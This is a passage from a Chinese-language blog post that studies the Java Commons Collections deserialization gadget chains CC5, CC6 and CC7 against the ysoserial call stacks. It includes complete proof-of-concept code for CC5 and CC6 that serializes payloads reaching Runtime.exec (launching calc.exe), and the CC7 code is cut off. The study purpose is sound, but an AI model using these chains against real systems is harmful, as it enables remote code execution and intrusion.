alt="image-20230526153922077"></p><p>这里返回了字符串，但是这里的关键在于<code>getValue()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526202958322.png" alt="image-20230526202958322"></p><p>在getValue()函数中，调用了<code>this.map.get()</code>，这里就是我们调用栈中的<code>LazyMap#get()</code></p><p>跟进到LazyMap中：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526210119671.png" alt="image-20230526210119671"></p><p>可以看到在第一个if中，调用了put()，这里就可以触发回调，进而触发ChainedTransformer。</p><p>这里调用的是super.map的put方法。</p><p>我们可以看到，LazyMap类是继承的<code>AbstractMapDecorator.class</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526211250634.png" alt="image-20230526211250634"></p><p>也就是说，这里我们是调用的AbstractMapDecorator中的map元素。</p><p>不过无伤大雅，LazyMap中的构造函数会直接帮我们完成设置元素的过程。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526211540048.png" alt="image-20230526211540048"></p><p>这里逻辑就已经理顺了，开始构造POC，命令执行的部分直接从CC1里面搬过来就好了。</p><h3 id="构造CC链5的POC"><a href="#构造CC链5的POC" class="headerlink" title="构造CC链5的POC:"></a>构造CC链5的POC:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">outerMap</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innerMap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tied</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="number">123</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setValue(bad,<span class="string">&quot;val&quot;</span>,tied);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC5.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(output);</span><br><span class="line">            ob.writeObject(bad);</span><br><span class="line">            ob.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC5.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ob2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(input);</span><br><span class="line">            ob2.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230526235820635.png" alt="image-20230526235820635"></p><h3 id="一个有趣的点："><a href="#一个有趣的点：" class="headerlink" title="一个有趣的点："></a>一个有趣的点：</h3><p>在调试POC的时候，我遇到了一个很奇怪的问题，就是当我使用IDEA的调试的时候，在<code>readObject()</code>之前就会弹出计算器。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527000615773.png" alt="image-20230527000615773"></p><p>一开始百思不得其解，一直以为是我的POC写错了，但是对比了网上别的师傅写的POC好几次之后，发现没什么问题。后面，在知识星球里面找到了一位师傅的分析。</p><p><strong>当IDEA在进行调试的时候，因为药输出相关对象的信息，所以会默认的调用到toString()方法，也就是此处会调用的TiedMapEntry类的toString()方法</strong></p><p>因为我们之前已经写好了TiedMapEntry类中的所有的需要的调用链，所以这里就会直接触发我们之前写好的调用链。</p><h2 id="CC链6："><a href="#CC链6：" class="headerlink" title="CC链6："></a>CC链6：</h2><blockquote><p>jdk 1.7&#x2F;1.8</p><p>common-collections 3.1</p></blockquote><p>这个链子，理论上来讲目前应该是没有jdk版本限制的。</p><p>CC6链子的出现，最主要的就是完善了CC1链在高版本不能使用的缺陷。</p><p>这里的学习，主要还是参考P神的Java安全漫谈和网上师傅的博客。</p><p>首先还是看一下ysoserial中给出的调用栈：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527004241448.png" alt="image-20230527004241448"></p><p>可以看到，这里的调用栈已经完全脱离了AnnotationInvocationHandler了。但是后面的命令执行部分，还是调用的<code>LazyMap#get()</code>，来连锁调用<code>ChainedTransformer</code>对象。</p><p>事实上，解决Java高版本利用问题，实际上就是在找上下文中是否还有其他调用<code>LazyMap#get()</code>方法。</p><p>这里跟一下链子：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527145049090.png" alt="image-20230527145049090"></p><p>这里调用了put函数，根据调用栈，这里应该是调用HashMap中的put函数。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527145151228.png" alt="image-20230527145151228"></p><p>可以看到这里，return中，调用了<code>hash()</code>，跟进：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527145240498.png" alt="image-20230527145240498"></p><p>一个三元判断，只要我们令key不为null即可调用我们需要的hashcode()函数。</p><p>为了调用<code>TiedMapEntry#hashCode()</code>,我们就将key设为一个TiedMapEntry的对象就行，然后就直接调用其中的getValue()函数。<img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527145628051.png" alt="image-20230527145628051"></p><p>这里也就回到了CC5中的链子。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527150007786.png" alt="image-20230527150007786"></p><p>直接调用<code>LazyMap#get()</code>即可。</p><h3 id="P神的简化链："><a href="#P神的简化链：" class="headerlink" title="P神的简化链："></a>P神的简化链：</h3><p>P神在Java安全漫谈12中写了一个简化的链子，其实主要简化部分，就是将入口从<code>HashSet#readObject()</code>中，换到了<code>HashMap#readObject()</code>中。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527150731762.png" alt="image-20230527150731762"></p><p>可以看到，在<code>HashMap#readObject()</code>中，<code>putVal()</code>中调用了<code>hash()</code>，这样就可以直接触发链，不需要那么长。</p><p>构建POC:</p><h3 id="构建POC："><a href="#构建POC：" class="headerlink" title="构建POC："></a>构建POC：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake);</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(tiedMap,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setValue(chain,<span class="string">&quot;iTransformers&quot;</span>,transformer);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC6.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(output);</span><br><span class="line">            ob.writeObject(hashmap);</span><br><span class="line">            ob.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC6.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ob2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(input);</span><br><span class="line">            ob2.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object,String name,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527191731291.png" alt="image-20230527191731291"></p><h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>整个POC是调用的P神给的简化版调用栈，也就是入口在HashMap里面。</p><p>这里有个比较特殊的地方，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527232219726.png" alt="image-20230527232219726"></p><p>这里是必须要使用remove函数，从outerMap对象中去除一个键值123的。</p><p>这是因为，当我们向HashMap的对象中存入键值的时候，也就是调用put函数的时候，<code>hashmap#put()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527232700434.png" alt="image-20230527232700434"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527232721914.png" alt="image-20230527232721914"></p><p>这里，我们会调用到<code>hash()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527232748494.png" alt="image-20230527232748494"></p><p>可以看到，这里就进入了我们之前规划好的调用链， 会提前触发一次。</p><p>这里来到最关键的调用点，<code>LazyMap#get()</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230527232920267.png" alt="image-20230527232920267"></p><p>在这次提前触发链中，在进行if判断的时候，其实就是判断我们传入进去的innerMap这个对象中有没有键值。</p><p>当我们创建时，什么都没有传入，很显然是不会存在键值的。</p><p>此时，就会进入if内，然后触发我们设置好的调用链，弹出一次计算器。</p><p>然后开始调用<code>super.map.put(key,value)</code>，这里就会将我们传入的key值，和我们执行完成<code>ChainedTransformer</code>返回的值存入Map中。</p><p>当我们后面进行反序列化的时候，就会发现，这里的if是过不去的了，因为已经存在我们设置好的键值。</p><p>所以我们需要在这里将设置好的键值删除，也就是调用<code>outerMap.remove()</code>。</p><p>之所以会使用到<code>outerMap.remove()</code>是因为我们这里，是去除父类中的map的键值key，也就是<code>super.map</code>。</p><p>当调用到outerMap中的remove()方法时，因为在LazyMap中不存在remove()方法，此时会自动调用它继承的父类AbstractMapDecorator中的remove()方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230528001727333.png" alt="image-20230528001727333"></p><p>此时完成对键值的删除。</p><h2 id="CC链7："><a href="#CC链7：" class="headerlink" title="CC链7："></a>CC链7：</h2><blockquote><p>jdk 1.7&#x2F;1.8</p><p>common-collections 3.1</p></blockquote><p>先看一眼ysoserial中的调用栈：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230528002052355.png" alt="image-20230528002052355"></p><p>可以看到后面这部分，还是在尝试调用LazyMap中的get()，然后通过get去调用<code>ChainedTransformer</code>，进而调用<code>InvokerTransformer</code>。然后通过反射的方式来到用<code>Runtime.class</code>中的<code>exec()</code>。</p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>跟一下前面部分的链子：</p><p><code>java.util.Hashtable#readObject():</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230528180534607.png" alt="image-20230528180534607"></p><p>在readObject()函数的最后，会发现这里调用了自身的<code>reconstitutionPut()</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230528180628633.png" alt="image-20230528180628633"></p><p>这里是将Hashtable中的key和value从序列化字符串中读出，然后作为参数传入。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230528181344061.png" alt="image-20230528181344061"></p><p>这里需要保证有一个value值，否则会直接报错。</p><p>后面部分有一个<code>key.hashCode()</code>，如果我们将key设置为<code>TiedMapEntry</code>类的对象，理论上可以回到CC6链，开始调用LazyMap。</p><p>不过这不是CC7的链，CC7的调用方式在<code>equals</code>。</p><p>要整体的看懂这里的链子，最重要的是要先正确的理解table这个参数。</p><p>首先，我们要知道的是在Hashtable中，table这个参数是transient的，也就是在进行序列化的时候，table是不会被写入到数据流中的。</p><p>这里首先看一下<code>Hashtable#writeObject()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529004706631.png" alt="image-20230529004706631"></p><p>可以看到，从框开始，通过for循环，将table中的所有键值对都存入了<code>entryStack</code>这个对象中。</p><p>随后在writeObject()函数将要结束的时候，将entryStack中的键值写入到序列化数据流中。</p><p>而在readObject()中，正是读出了这里得到的键值对，然后依次存入key和value参数中。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529005116710.png" alt="image-20230529005116710"></p><p>随后调用了<code>reconstitutionPut()</code>函数。这个函数的主要效果是将读出的key和value放到全新的table这个参数中。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529005431649.png" alt="image-20230529005431649"></p><p>在这个函数里面，首先对value进行了一个if判断，需要value不是null。</p><p>然后开始计算key对应的哈希值，通过位运算获取到key对应的索引值。然后开始进行for循环。</p><p>在循环中，创建了一个Entry对象e，用于获取tab中索引对应的键值对。随后进行判断，若e中的哈希值和键值都与我们此次传入的相同，则代表table中已经存在了这个键值对，直接报错。</p><p>否则，就将键值对添加进去。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529010236811.png" alt="image-20230529010236811"></p><p>这里有个key.hashCode()的调用，理论上这里可以接上CC6那条链子。</p><p>以及这里有一个特点，当第一次调用这个<code>reconstitutionPut()</code>的时候，table中是空的，因此不会进行for循环进行判断，而是直接把键值对放进去。 </p><p>不过CC7调用链不在这里，在equals。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529010320466.png" alt="image-20230529010320466"></p><p>这里的key，应该是一个LazyMap对象，但是因为LazyMap中没有equals()，所以会像之前调用remove一样，调用到父类AbstractMapDecorator中的equals方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529010757426.png" alt="image-20230529010757426"></p><p>这里是一个三元运算式，如果我们传入的object和this没有引用同一个对象，则调用<code>map.equals()</code>，因为map是我们在创建LazyMap时传入的HashMap对象，因此这里是调用的HashMap中的equals()</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529012156528.png" alt="image-20230529012156528"></p><p>但是会发现HashMap中其实没有equals()函数，上面这个函数是一个内部类中的，因此是调用的它的继承的抽象类中的函数equals()。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529013021343.png" alt="image-20230529013021343"></p><p>可以看到这里调用了get，即可触发<code>LazyMap#get()</code>。</p><h3 id="总结条件："><a href="#总结条件：" class="headerlink" title="总结条件："></a>总结条件：</h3><p>这里需要回头看一下m是怎么来的：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529151233124.png" alt="image-20230529151233124"></p><p>也就是说，m是我们一开始，从序列化流中读取出来的key，这个是我们可以控制的，只要能够保证这个key，就可以完成调用。</p><p>这里不妨先梳理一下key所需要具备的条件：</p><blockquote><ol><li>我们调用的是LazyMap类的父类中的equals()，因此，e.key需要是LazyMap对象。</li><li>随后调用的是this.map.equals()函数，这里调用的是HashMap的父类，AbstractMap中的equals()函数，为了利用其中的get()，则我们传入的key，即object需要是LazyMap的对象。</li><li>因为我们知道在第一次for循环的时候，table中为空，所以会直接将键值对存放入table中，当我们进行for循环中的if判断的时候，实质上就是将第一次传入的键值对，与这一次传入的键值对进行判断。</li></ol></blockquote><p>综上，我们可以知道，我们要保证第一次和第二次传入的key都是LazyMap的对象，同时要保证，两次传入的key进行了hashcode()计算后，值是一样的，这样才能调用到equals。</p><p>同时，这里也解释了一个问题，就是在调用equals的时候，为什么要通过<code>AbstractMapDecorator</code>类去间接的调用<code>AbstractMap</code>中的equals，而不是直接在if中，通过可以控制的e.key来调用<code>AbstractMap</code>中的<code>equals()</code>，就是因为不能控制正确的hashcode。</p><h3 id="hashCode-函数："><a href="#hashCode-函数：" class="headerlink" title="hashCode()函数："></a>hashCode()函数：</h3><p>因为我们传入的两个key都是LazyMap的对象，所以这里调用的hashCode()函数也是存在于LazyMap中的函数。这里可以详细看一下计算逻辑，尝试构造一个合理的哈希值。</p><p>可以发现在LazyMap中没有hashCode()函数，跟进到父类AbstractMapDecorator中。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529162907176.png" alt="image-20230529162907176"></p><p>this.map是HashMap对象，跟进到HashMap中：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529163134599.png" alt="image-20230529163134599"></p><p>可以发现这里调用了Objects中的hashCode()函数，对键和值进行hashCode计算，然后进行异或。跟进：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529170045933.png" alt="image-20230529170045933"></p><p>因为函数中的o是hashmap中的key和value，所以这里实际上是调用的String中的hashCode()。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529170905720.png" alt="image-20230529170905720"></p><p>可以看到，这里的逻辑就是将一个字符串拆解开，将每个字符存放在char类型数组val中，随后将哈希值h乘31，然后再加上当前字符的Ascii码，随后赋给h，实际上就是一个累加的过程。</p><p>因为默认的h为0，这个过程实际上就是：</p><blockquote><p>Ascii(数值1)*31+Ascii(数值2)</p></blockquote><p>这就很简单了，只要找到两个合适的字符，就可以生成相同的hashcode。</p><p>比如xO和y0，yy和Zz。</p><p>也就是说，只要我们保证键值为上述任意一组字符串，即可达成if条件。</p><p>到这里为止，就分析的差不多了，开始尝试构建POC。</p><h3 id="构建POC：-1"><a href="#构建POC：-1" class="headerlink" title="构建POC："></a>构建POC：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 